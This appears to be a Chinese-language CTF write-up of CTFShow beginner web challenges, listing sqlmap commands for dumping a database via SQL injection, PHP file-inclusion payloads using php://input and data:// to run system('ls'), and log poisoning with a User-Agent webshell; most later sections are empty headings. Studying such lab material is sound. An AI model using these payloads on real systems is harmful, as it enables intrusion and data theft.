# Web

## 前置

### web签到题

进入靶机，按下F12，发现注释里一串base64编码

![发现目标](.\图片\前置\web签到题.png)

解码得到flag



### web2

最简单的SQL注入

那就注入试试

先用sqlmap解题

抓包查看密码存储方式，发现是明文POST请求存储

![](.\图片\前置\web2\抓包查看密码存储方式.png)

```
sqlmap -u "http://c1715296-bf6c-44e4-a87c-2c56d5b761c1.challenge.ctf.show/" --data="username=admin&password=123456" --dbs
```

生成的payload:username=admin' UNION ALL SELECT NULL,CONCAT(0x71786b7671,0x416151487a54695241536a41434f687259736b4551496d4957444e575944765354566c41794e514d,0x717a787071),NULL-- -&password=123456

爆它库名得到

![](.\图片\前置\web2\爆它库名.png)

发现有个web2，然后爆他的表

```
sqlmap -u "http://c1715296-bf6c-44e4-a87c-2c56d5b761c1.challenge.ctf.show/" --data="username=admin&password=123456" -D web2 --tables --batch
```

![](F:\CTFShow-Web\Web\图片\前置\web2\爆它的表.png)

然后发现了flag，爆他的列！

```
sqlmap -u "http://c1715296-bf6c-44e4-a87c-2c56d5b761c1.challenge.ctf.show/" --data="username=admin&password=123456" -D web2 -T flag --columns --batch
```

![](.\图片\前置\web2\爆它的列.png)

是一个可以读写的值，爆他的值！

```
sqlmap -u "http://c1715296-bf6c-44e4-a87c-2c56d5b761c1.challenge.ctf.show/" --data="username=admin&password=123456" -D web2 -T flag -C flag --dump --batch
```

![](.\图片\前置\web2\爆它的值.png)

芜湖起飞！

都什么年代了，还在玩传统注入？（手动滑稽保命）



### web3

更简单的web题

那看来web2就是让人练习sqlmap的使用的，这payload打这么多个也确实很费力！

### `<?php include($_GET['url']);?>`

还用想吗？炒鸡典型的文件包含。

payload:?url=php://input

开始POST请求执行系统命令

<?=system("ls");?> 得到目录下文件

![](.\图片\前置\web3\得到目录下文件.png)

有一个非常明显的ctf_go_go_go，访问它，下载下来，查看

![](.\图片\前置\web3\得到flag.png)

此题终结

### web4

又一次

### `<?php include($_GET['url']);?>`

那按原方法试试看？

发现php://input不太行

再试试data://text/plain,<?php system("ls");?>

都不行？那就只能上后门了。

?url=/var/log/nginx/access.log，打开日志，发现有输出浏览器UA。

然后UA插一句话木马，上AntSword，刀它！

flag文件在/var/www/flag.txt位置。

![](.\图片\前置\web4.png)

### web5





## 萌新赛

## 内部赛

## 36D练手赛

## 36D杯

## WEB AK赛

## 月饼杯

## 1024杯

## 原谅杯

## ROARCTF复现

## 大吉大利杯

## F5杯

## 渔人杯

## 大牛杯

## baby杯

## 吃鸡杯

## 吃瓜杯

## 月饼杯II

## 击剑杯

## 摆烂杯

## 新春欢乐赛

## 卷王杯

## 单身杯

## 七夕杯

## 新手杯

## 年CTF

## 2023愚人杯